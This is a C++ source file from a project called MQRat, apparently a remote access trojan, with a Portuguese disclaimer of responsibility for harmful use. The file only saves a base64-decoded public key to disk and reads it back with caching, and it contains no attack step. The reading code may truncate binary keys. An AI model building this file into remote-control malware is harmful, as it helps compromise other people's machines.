/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <fstream>
#include "encoders/base64.hpp"
#include "key_manager.hpp"

using namespace std;

KeyManager::KeyManager()
{
	this->filename = "public_key.dat";
}

string KeyManager::GetFilename() {
	return this->filename;
}

void KeyManager::SavePublicKey(string pk) {
	ofstream file(this->filename, ios_base::out);
	
	// Decode public key and save
	auto decoded_pk = base64_decode(pk);

	file << decoded_pk;
	file.close();
}

string KeyManager::ReadPublicKey() {
	static bool cached = false;
	string public_key;

	if(!cached) {

		// Open file
		ifstream file(this->filename, ios_base::in);
		
		// Read public key into memory
		file >> public_key;

		// Closes file
		file.close();

		pk = public_key;

		cached = true;

		return public_key;
	}
	
	// returns the previously public key stored in memory
	return pk;
}